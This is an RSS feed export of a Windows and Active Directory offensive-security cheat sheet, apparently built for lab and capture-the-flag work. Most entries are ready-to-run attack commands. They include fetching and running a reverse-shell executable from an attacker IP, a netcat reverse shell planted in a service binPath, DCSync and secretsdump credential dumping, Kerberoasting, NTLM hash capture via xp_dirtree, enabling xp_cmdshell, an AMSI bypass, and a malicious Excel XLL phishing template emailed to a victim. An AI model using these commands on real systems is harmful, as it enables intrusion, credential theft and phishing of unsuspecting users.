channel.title: Windows on TLDRBins
channel.description: Recent content in Windows on TLDRBins

item.title: AD Recycle Bin
item.description: AD Recycle Bin import-module activedirectory # Query all deleted objects within domain Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects # Get all details for the deleted account (e.g. TempAdmin) Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property * # Restore deleted account (Need to rename to avoid user exist) Restore-ADObject -Identity ObjectGUID -NewName "new_user" -TargetPath "CN=Users,DC=example,DC=com"

item.title: Alternate Data Stream
item.description: Show ADS # cmd cmd /C dir /R \windows\tasks\file.txt Get-Item -Path \windows\tasks\file.txt -force -stream *

item.title: Bloodhound
item.description: sharphound.ps1 Download sharphound.ps1 # Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all

item.title: Bypass ASMI
item.description: evil-winrm menu Bypass-4MSI Note: have to run menu first

item.title: Compressed Files
item.description: Hint: Always put the zip file inside a new folder before unzip zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # unzip unzip file.zip # unzip (powershell) Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\windows\tasks\file.zip', 'c:\windows\tasks\') tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.tar.gz folder/ # Extract tar -xvzf file.tar.gz gz # Compress file, and keep the original file gzip -k -r file # Compress all files individually inside a folder, and keep original files gzip -k -r folder/ # Extract gunzip file.

item.title: dotnet
item.description: Compile c# project from Linux Download dotnet # Check dotnet --info # Prepare mkdir new_project cd new_project # Init dotnet new console # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Run dotnet run

item.title: File Transfer (Linux to Windows)
item.description: HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe c:\windows\tasks\rev.exe && c:\windows\tasks\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile c:\windows\tasks\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: PowerShell 3.0+ # Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o c:\windows\tasks\rev.exe Note: curl is not always available

item.title: File Transfer (Windows To Linux)
item.description: SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.

item.title: Find (Windows)
item.description: Find a file ls -path \Users -Filter file.txt -recurse -erroraction silent where /R C:\Users file.txt Find a file, with rule dir /s /b /a:-d-h \Users\Administrator | findstr /i /v "appdata" +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v appdata : exclude 'appdata' | +---------------------------------------+ Show hidden files Get-ChildItem -force

item.title: Firewall (Windows)
item.description: Check Firewall Rules # cmd cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:" # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True

item.title: GenericAll
item.description: Using PowerView.ps1 . .\PowerView.ps1 Authenticated # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members USER Runas $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members USER -Credential $Cred

item.title: GenericWrite
item.description: Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10

item.title: GetChanges/GetChangesAll
item.description: GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 Mimikatz (From Windows) .\mimikatz.exe 'lsadump::dcsync /domain:EXAMPLE.COM /user:administrator' exit

item.title: Host a SMB Server
item.description: Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username test -password test Note: Sometimes smb server with creds may not work For older Windows Machines impacket-smbserver share .

item.title: IIS
item.description: IIS Version +-------------------------------------------------------------------------------+ |Version Start Date End Date | +-------------------------------------------------------------------------------+ |IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | |IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | |IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027| |IIS 10 on Windows 10 Pro Jul 29, 2015 | |IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | |IIS 8.

item.title: Kerberoasting
item.description: AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request 'example.com/user:password' -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password

item.title: Kerberos
item.description: Kerbrute Download kerbrute kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .

item.title: LDAP
item.description: Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u 'example.com\username' -p 'passowrd' 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -h 10.10.11.10 -s base namingcontexts # Get info about domain ldapsearch -x -h 10.10.11.10 -b 'DC=EXAMPLE,DC=COM' # Just get a class (e.g. person) ldapsearch -x -h 10.10.11.10 -b 'DC=EXAMPLE,DC=COM' '(objectClass=person)'

item.title: Metasploit
item.description: Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: Microsoft Access Database
item.description: Tool sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done # Dump data from table mdb-export database.mdb table_name

item.title: Microsoft Oulook Email Folder
item.description: Open .pst file Tool sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Use mutt mutt -Rf emails.mbox +------------------------------------+ |Note: Answer No to create /root/Mail| | | |Arrow : Move to the email | |Enter : View email | |q : back | |q again : quit | +------------------------------------+

item.title: MSSQL General
item.description: General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = '1'; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER'); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.

item.title: MSSQL Linked Servers
item.description: Linked Servers Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [DOMAIN\LINKED_SERVER]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [DOMAIN\CURRENT_SERVER]') at [DOMAIN\LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN test WITH PASSWORD = ''''Test1234!

item.title: MSSQL Privilege Escalation
item.description: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree '\\10.10.14.10\any\thing'; # Or use master; exec xp_dirtree '\\10.10.14.10\any\thing'; # Or load_file('\\10.10.14.10\any\thing'); Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: NetExec (nxc)
item.description: nxc Download nxc SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash WINRM # Single user and password nxc winrm 10.

item.title: Phishing
item.description: Phishing with XLL (Excel) revshells.com shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to "victim@victim.

item.title: RPC
item.description: RPC rpcclient # Connect without creds rpcclient -U '' -N 10.10.11.10 # Connect with creds rpcclient -U domain/username%password 10.10.11.10 # Inline execute command rpcclient -U domain/username%password 10.10.11.10 -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup RID # Query group member by rid querygroupmem RID # Query user by rid queryuser RID # Look up a user lookupnames USERNAME # Look up by SID lookupsids SID impacket-lookupsid impacket-lookupsid username:password@10.

item.title: Runas
item.description: Runas (with creds) Create Cred Object $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Run Commnad Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost -auth credssp Create a new PS session new-pssession -computername . -credential $cred # Switch to new session enter-pssession 1 Runas (with cache creds) Check cache creds cmdkey /list Run Command # e.

item.title: secretsdump
item.description: Impacket Download Impacket secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10

item.title: Secure String
item.description: Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "administrator", $ss $cred.GetNetworkCredential().password

item.title: Server Operators
item.description: Server Operators # Change a service path (e.g. browser) sc.exe config browser binPath= "C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443" # Stop service sc.exe stop browser # Start service sc.exe stop browser

item.title: SMB Enum
item.description: SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 10.10.11.10 Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 -u null --no-banner # List known share smbmap -H 10.10.11.10 -r 'share' smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.10.11.10\\ --option='client min protocol=NT1' Login with password smbmap smbmap -H 10.

item.title: Windows ACLs
item.description: Window ACLs (Access Control Lists) Check ACLs # Check a file/directory icacls "C:\Users\User" # Check all files and directories icacls * /C Grant user full control icacls file_name /grant user:F +-------------------------------------------------+ |F (full access) | |M (modify access) | |RX (read and execute access) | |R (read-only access) | |W (write-only access) | |D (delete) | |RC (read control) | |WDAC (write DAC) | |WO (write owner) | |S (synchronize) | |AS (access system security) | |MA (maximum allowed) | |GR (generic read) | |GW (generic write) | |GE (generic execute) | |GA (generic all) | |RD (read data/list directory) | |WD (write data/add file) | |AD (append data/add subdirectory) | |REA (read extended attributes) | |WEA (write extended attributes) | |X (execute/traverse) | |DC (delete child) | |RA (read attributes) | |WA (write attributes) | |OI (object inherit) | |CI (container inherit) | |IO (inherit only) | |NP (do not propagate inherit) | |I (permission inherited from parent container)| +-------------------------------------------------+

item.title: WriteDacl
item.description: Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync Runas $username = "domain\username" $password = "password" $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity 'USER' -TargetIdentity 'EXAMPLE.COM\Domain Admins' -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10
